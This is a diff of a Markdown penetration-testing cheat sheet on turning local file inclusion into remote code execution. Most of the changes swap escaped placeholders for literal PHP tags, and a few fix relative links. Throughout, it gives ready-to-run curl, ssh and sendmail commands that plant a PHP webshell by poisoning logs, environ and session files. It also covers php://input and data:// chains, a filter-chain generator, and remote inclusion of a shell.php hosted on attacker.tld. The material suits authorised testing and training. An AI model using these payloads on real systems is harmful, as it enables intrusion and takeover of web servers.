@@ -195,29 +195,29 @@ Inject PHP code into a log file, then include the log via LFI.
 **Apache access.log:**
 
 ```bash
-curl -A '%%LT%%?php system($_GET['c']); ?%%GT%%' 'http://target/'
+curl -A '<?php system($_GET['c']); ?>' 'http://target/'
 curl 'http://target/?file=/var/log/apache2/access.log&c=id'
 ```
 
 **Apache error.log** (payload in URL, triggers 404):
 
 ```bash
-curl 'http://target/%%LT%%?php system($_GET['c']); ?%%GT%%'
+curl 'http://target/<?php system($_GET['c']); ?>'
 curl 'http://target/?file=/var/log/apache2/error.log&c=id'
 ```
 
 **SSH auth.log** (if OpenSSH accepts weird usernames):
 
 ```bash
-ssh '%%LT%%?php system($_GET['c']); ?%%GT%%'@target
+ssh '<?php system($_GET['c']); ?>'@target
 curl 'http://target/?file=/var/log/auth.log&c=id'
 ```
 
 **Mail log** (send an email with payload in From/Subject):
 
 ```bash
-sendmail attacker@target %%LT%%/dev/null
-Subject: %%LT%%?php system($_GET['c']); ?%%GT%%
+sendmail attacker@target </dev/null
+Subject: <?php system($_GET['c']); ?>
 ```
 
 **Log paths to know:**
@@ -239,7 +239,7 @@ If the target has a writable User-Agent (or Referer) reflected in environ,
 include it:
 
 ```bash
-curl -A '%%LT%%?php system($_GET['c']); ?%%GT%%' 'http://target/?file=/proc/self/environ&c=id'
+curl -A '<?php system($_GET['c']); ?>' 'http://target/?file=/proc/self/environ&c=id'
 ```
 
 Often blocked by modern kernels (proc hidepid, permissions). Fallback:
@@ -254,7 +254,7 @@ If the app stores session data in a file with attacker-controlled content:
 3. Include the session file via LFI.
 
 ```bash
-curl 'http://target/login' -b 'PHPSESSID=abc123' -d 'username=%%LT%%?php system($_GET['c']); ?%%GT%%&password=x'
+curl 'http://target/login' -b 'PHPSESSID=abc123' -d 'username=<?php system($_GET['c']); ?>&password=x'
 curl 'http://target/?file=/var/lib/php/sessions/sess_abc123&c=id'
 ```
 
@@ -263,15 +263,15 @@ curl 'http://target/?file=/var/lib/php/sessions/sess_abc123&c=id'
 **Chain 1: LFI + log poisoning -> webshell**
 
 ```bash
-curl -A '%%LT%%?php system($_GET['c']); ?%%GT%%' 'http://target/'
+curl -A '<?php system($_GET['c']); ?>' 'http://target/'
 curl 'http://target/?file=/var/log/apache2/access.log&c=id'
 ```
 
 **Chain 2: LFI + php://input -> RCE** (requires allow_url_include=On):
 
 ```bash
-curl 'http://target/?file=php://input' --data '%%LT%%?php system($_GET['c']); ?%%GT%%'
-curl 'http://target/?file=php://input&c=id' --data '%%LT%%?php system($_GET['c']); ?%%GT%%'
+curl 'http://target/?file=php://input' --data '<?php system($_GET['c']); ?>'
+curl 'http://target/?file=php://input&c=id' --data '<?php system($_GET['c']); ?>'
 ```
 
 **Chain 3: LFI + data:// -> RCE** (requires allow_url_include=On):
@@ -280,12 +280,12 @@ curl 'http://target/?file=php://input&c=id' --data '%%LT%%?php system($_GET['c']
 curl 'http://target/?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg=='
 ```
 
-(base64 of %%LT%%?php system($_GET['c']); ?%%GT%%)
+(base64 of <?php system($_GET['c']); ?>)
 
 **Chain 4: LFI + /proc/self/environ -> RCE:**
 
 ```bash
-curl -A '%%LT%%?php system($_GET['c']); ?%%GT%%' 'http://target/?file=/proc/self/environ&c=id'
+curl -A '<?php system($_GET['c']); ?>' 'http://target/?file=/proc/self/environ&c=id'
 ```
 
 ### 4.7 PHP filter chain RCE
@@ -297,7 +297,7 @@ Requires the LFI to allow php://filter with any resource. Tool:
 
 ```bash
 git clone https://github.com/synacktiv/php_filter_chain_generator
-python3 php_filter_chain_generator.py --chain '%%LT%%?php system($_GET['c']); ?%%GT%%'
+python3 php_filter_chain_generator.py --chain '<?php system($_GET['c']); ?>'
 # copy the generated php://filter/... URL into ?file=
 ```
 
@@ -315,7 +315,7 @@ Host a PHP file on your server:
 
 ```bash
 # shell.php (on attacker)
-%%LT%%?php system($_GET['c']); ?%%GT%%
+<?php system($_GET['c']); ?>
 
 # Start HTTP server
 python3 -m http.server 80
@@ -380,7 +380,7 @@ curl 'http://target/?file=php://filter/convert.base64-encode/resource=index.php'
 ### 6.2 php://input RCE
 
 ```bash
-curl 'http://target/?file=php://input' --data '%%LT%%?php system($_GET['c']); ?%%GT%%'
+curl 'http://target/?file=php://input' --data '<?php system($_GET['c']); ?>'
 ```
 
 ### 6.3 data:// RCE
@@ -455,7 +455,7 @@ ffuf -u 'http://target/?file=FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddi
 > LFI -> RCE chain is a common foothold. Always attempt: (1) log poisoning,
 > (2) php://input or data:// if allow_url_include=On, (3) session file poisoning.
 >
-> See [../../../methodology/OSCP-Reporting.md](../../../methodology/OSCP-Reporting.md).
+> See [../../methodology/OSCP-Reporting.md](../../methodology/OSCP-Reporting.md).
 
 ---
 
@@ -470,14 +470,14 @@ curl 'http://target/?file=/etc/passwd'
 curl 'http://target/?file=php://filter/convert.base64-encode/resource=index.php' | base64 -d
 
 # Log poisoning -> RCE
-curl -A '%%LT%%?php system($_GET['c']); ?%%GT%%' 'http://target/'
+curl -A '<?php system($_GET['c']); ?>' 'http://target/'
 curl 'http://target/?file=/var/log/apache2/access.log&c=id'
 
 # php://input RCE (allow_url_include=On)
-curl 'http://target/?file=php://input' --data '%%LT%%?php system($_GET['c']); ?%%GT%%'
+curl 'http://target/?file=php://input' --data '<?php system($_GET['c']); ?>'
 
 # /proc/self/environ RCE
-curl -A '%%LT%%?php system($_GET['c']); ?%%GT%%' 'http://target/?file=/proc/self/environ&c=id'
+curl -A '<?php system($_GET['c']); ?>' 'http://target/?file=/proc/self/environ&c=id'
 
 # RFI
 curl 'http://target/?file=http://attacker.tld/shell.php&c=id'
@@ -493,7 +493,7 @@ curl 'http://target/?file=http://attacker.tld/shell.php&c=id'
 - LFISuite: https://github.com/D35m0nd142/LFISuite
 - Kadimus: https://github.com/P0cL4bs/Kadimus
 
-> See also: [../01 Recon/WAF-Detection.md](../01%20Recon/WAF-Detection.md), [../06 Technologies/XXE.md](../06%20Technologies/XXE.md), [File-Upload.md](./File-Upload.md)
+> See also: [../01 Recon/WAF-Detection.md](../01%20Recon/WAF-Detection.md), [../06 Technologies/XXE.md](../07%20Vulnerabilities/XXE.md), [File-Upload.md](./File-Upload.md)
 
 ---
 
